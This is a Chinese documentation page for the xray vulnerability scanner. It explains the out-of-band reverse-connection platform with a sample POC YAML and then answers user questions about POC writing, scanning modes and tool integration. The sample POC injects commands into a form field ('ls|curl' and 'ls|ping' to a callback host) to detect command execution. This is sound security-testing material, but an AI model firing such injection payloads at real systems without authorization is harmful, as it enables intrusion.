# 反连平台的配置与使用
[如何部署xray反连平台](../../scenario/reverse.md)
## 使用反连平台的POC
```yaml
name: poc-yaml-test
manual: true
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
    reverseDomain: reverse.domain
rules:
    // 使用常规反连
    r0:
        request:
            cache: true
            method: POST
            path: /run
            body: test=ls|curl+{{reverseURL}}
        expression: reverse.wait(5)
    // 使用dns反连
    r1:
        request:
            cache: true
            method: POST
            path: /run
            body: test=ls|ping+reverseDomain
        expression: reverse.wait(5)
expression: r0() || r1()
detail:
    author: test
    links:
        - http://test.com
```

## Q&A
**Q：能出个gui版本吗？**
A：目前我们的内部师傅已经编写了一个图形化界面辅助工具，可以试用一下，未来我们将会有一个正式的GUI版本
项目地址：[https://github.com/4ra1n/super-xray](https://github.com/4ra1n/super-xray)
教学视频：[https://www.bilibili.com/video/BV1p8411j7vX/](https://www.bilibili.com/video/BV1p8411j7vX/)

**Q：可否基于现有公开漏洞库（如www.exploit-db.com或www.seebug.org）在CT STACK社区做一个实时xray poc悬赏列表，方便用户知道哪些漏洞的poc可以提交，另外如何快速，隐蔽，高效地测试对目标的最优扫描参数，从而优化扫描速度，兼顾速度与隐蔽性**
A：在后续的版本中，xray将会优化插件的筛选，到时可以查看到我们当前有的编号漏洞，可以按照产品分类展示，方便提交者可以确认已经存在了哪些漏洞，还有哪些可以提交，同时我们也上线了在线poc生成器，可以通过表单的填写自动生成poc，同时可以直接进行poc查重，不浪费时间。同时后面我们也会有需求列表以活动的形式上线，师傅们可以多多关注官网
A：先对目标进行信息收集，然后针对性启动插件进行扫描
poc生成器：[https://poc.xray.cool](https://poc.xray.cool)

**Q：想了解如何提升编写poc的技术，以及怎么样的poc会更容易通过审核呢？**
A：多多看前面四期的视频，以及关注官方文档的更新吧，基本上所有的技巧都在里面了。并且现在还有poc模版以及poc生成器，所以说基本上了解一个漏洞是如何被检测的，同时检测规则写的严格一些，就能写出一个好的poc。
A：同时在选择编写什么漏洞的poc时，可以先关注一下近五年危险等级较高的漏洞，这类漏洞的poc会有较多的奖励。

**Q：可不可以分享x-ray更多实际应用场景和小技巧**
A：如果有长期稳定的服务器，非常建议去租一个域名，随便选择一个便宜的就好，然后在这个服务器上按照反连平台的配置文章配置好反连平台，这样才能完整的体验全部的检测功能
A：在进行测试的时候，不建议在xray的上层再添加burp的代理，因为burp会对数据包再做一些事情，可能导致漏洞验证失败。例如会自动修改headers中的connection的内容，需要在options中勾选掉对应选项才可以。
A：在没有扫描到漏洞的时候，是不会生成报告的
A：还有一些常见问题将整理在另一个文档中，后续会放置在官网

**Q：与其他工具的联动**
A：xray在漏洞扫描方面主要存在两个扫描方式，主动扫描与被动扫描，当指定主动扫描的时候，xray会主动向目标发送payload进行探测，最具代表性的的就是--url命令，xray会主动访问这个地址，然后直接对这个地址发送规则内的所有payload，如果有命中，则证明探测出漏洞。
A：当指定被动扫描的时候，xray会开启一个端口接收http流量，xray在拿到这些流量后，会将自身的payload与现有的流量按照一定的规则进行重组并发送出去，从而根据返回进行判断时候存在漏洞。
A：所有在了解了这两点之后，我们就能大概知道什么样的工具可以与xray进行联动，比如你想要查看xray发送的包，进行调试，就可以将抓包工具设置为xray的上层代理，在抓包工具中查看xray的行为
A：或者想要让xray对某个网站进行全量的扫描，就可以将xray的被动代理模式开启，然后：

1. 将xray作为浏览器的上层代理，自己点击网站功能点来触发网站的功能，从而将流量喂给xray进行扫描
2. 将xray作为爬虫的上层代理，比如rad，使用爬虫代替人进行点击。但对于单个网站的时候，如果要进行细致的扫描，就还是不建议这样操作，因为爬虫没有办法处理某些需要某些前置条件才能触发的功能点，就比如需要 点击A->输入B->点击C 才能出现功能点D，这种情况，爬虫可能就无法顾及到，只有人来操作才能保证所有的功能点都被触发。

**Q：xray是怎么实现在扫描过程中减少对业务的影响**
A：xray中所有的payload都是无害化的，全部都遵循了编写poc中的无害化原则，不会指定数据库读取，木马上传，dos等行为。如果存在上传行为，也一定是对文件名做好随机处理，文件内容仅进行计算，且会尽最大可能的将上传的文件删除掉。
A：sql注入会让数据库执行md5计算，命令执行则是执行expr等。同时可以限制发送的方法，以防造成数据污染。详情可以参考poc编写指南第四期的内容，参考其中危害性的部分
[POC编写指南第四期](/#/guide/course/phaseIV?id=危害性)

**Q：支持外部dnslog**
A：我们有计划开放一个自己的反连平台，到时候xray会自动支持

**Q：会有提供接口的打算吗？用编程语言写脚本比yml更方便，可拓展性更强**
A：我们在将要发布xray2.0版本中，将支持编写插件脚本，动态加载到xray中运行，等版本发布时，会同步更新上对应的教程。
